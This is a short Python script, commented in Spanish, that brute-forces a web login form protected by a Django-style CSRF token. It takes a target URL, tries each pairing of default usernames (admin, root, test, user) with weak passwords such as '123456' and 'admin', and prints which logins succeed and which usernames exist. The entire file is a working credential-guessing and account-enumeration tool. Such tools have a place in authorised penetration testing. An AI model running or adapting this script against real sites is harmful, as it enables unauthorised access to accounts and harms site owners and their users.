import requests
import re

def obtener_csrf_token(session, url_login):
    """Hace una petición GET y extrae el token CSRF del formulario HTML."""
    try:
        response = session.get(url_login, timeout=5)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] No se pudo acceder al formulario: {e}")
        return None

    match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
    return match.group(1) if match else None

def probar_combinacion(url_login, usuario, password):
    session = requests.Session()
    csrf_token = obtener_csrf_token(session, url_login)
    if not csrf_token:
        return

    datos = {
        "username": usuario,
        "password": password,
        "csrfmiddlewaretoken": csrf_token
    }

    headers = {
        "Referer": url_login,
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = session.post(url_login, data=datos, headers=headers, timeout=5, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {usuario}:{password} → No se pudo conectar: {e}")
        return

    location = response.headers.get("Location", "")
    cookies = session.cookies.get_dict()
    html = response.text.lower()

    if response.status_code in [301, 302] and "/login" not in location:
        print(f"[✔] Login exitoso → Usuario: {usuario} | Contraseña: {password}")
    elif "sessionid" in cookies and "contraseña incorrecta" not in html and "usuario" not in html:
        print(f"[✔] Login exitoso (cookie) → Usuario: {usuario} | Contraseña: {password}")
    elif "contraseña incorrecta" in html:
        print(f"[!] Usuario válido, contraseña incorrecta → {usuario}")
    elif "usuario no existe" in html or "usuario inválido" in html:
        print(f"[X] Usuario inválido → {usuario}")
    else:
        print(f"[?] Respuesta ambigua → {usuario}:{password}")

def main():
    print("=== Fuerza Bruta Controlada con CSRF (Multi-usuario, Multi-password) ===\n")
    url = input("Ingresa la URL completa del login (ej. https://ejemplo.com/accounts/login/): ").strip()

    usuarios = ["admin", "root", "test", "user"]
    passwords = ["admin1234", "123456", "admin", "test123"]

    for usuario in usuarios:
        for password in passwords:
            probar_combinacion(url, usuario, password)

if __name__ == "__main__":
    main()
